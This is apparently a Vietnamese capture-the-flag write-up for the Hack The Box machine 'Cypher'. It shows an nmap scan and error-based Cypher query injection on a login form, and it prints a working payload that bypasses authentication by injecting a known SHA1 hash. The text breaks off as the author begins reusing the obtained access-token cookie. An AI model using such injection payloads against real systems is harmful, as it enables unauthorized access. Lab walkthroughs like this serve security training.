# Cypher

<img width="1451" height="661" alt="image" src="https://github.com/user-attachments/assets/c838478a-d0f7-4bc8-8fff-cad6cce9665d" />

Tôi dùng nmap để scan các port:
```
❯ sudo nmap -sV -sS 10.10.11.57
[sudo] password for namdeptrai: 
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-18 11:24 +0700
Nmap scan report for cypher.htb (10.10.11.57)
Host is up (0.054s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.73 seconds
```

Sau khi truy cập trên trình duyệt thì hiện ra trang web này, tôi có fuzz các endpoint, dir, subdomain nhưng không ra được kết quả khả quan lắm

<img width="1862" height="952" alt="image" src="https://github.com/user-attachments/assets/6bb9022c-8df0-41fc-ab89-0948e5e7ab14" />

Ở trang web này có xuất hiện trang sign in:

<img width="1836" height="541" alt="image" src="https://github.com/user-attachments/assets/5f44e754-5105-4d82-acd9-968730c43c4f" />

<img width="1600" height="768" alt="image" src="https://github.com/user-attachments/assets/f1829ac8-f956-4912-9e9c-d13bfe3cdd98" />

Khi tôi thêm dấu `'` vào username thì hiển thị ra lỗi, có vẻ nó bị dính injection:

<img width="1515" height="765" alt="image" src="https://github.com/user-attachments/assets/674d1395-fd5b-45a5-a745-8e4f7c44ee9d" />

Đọc ở phần lỗi thì cấu trúc của câu truy vấn là `MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin'' return h.value as hash`, tôi tạo payload là:
```
{"username":"test' OR true return \"a94a8fe5ccb19ba61c4c0873d391e987982fbbd3\" as hash; //","password":"test"}
```
Với đoạn hash ở đây là hash của `test` và khi mật khẩu trùng khớp với hash thì sẽ qua được login:

<img width="1498" height="649" alt="image" src="https://github.com/user-attachments/assets/12ca30d9-9504-4261-9b00-4cc416e85a55" />

Và có được cookie là `access-token`, sử dụng `Match and replace` để tiếp tục truy cập:



















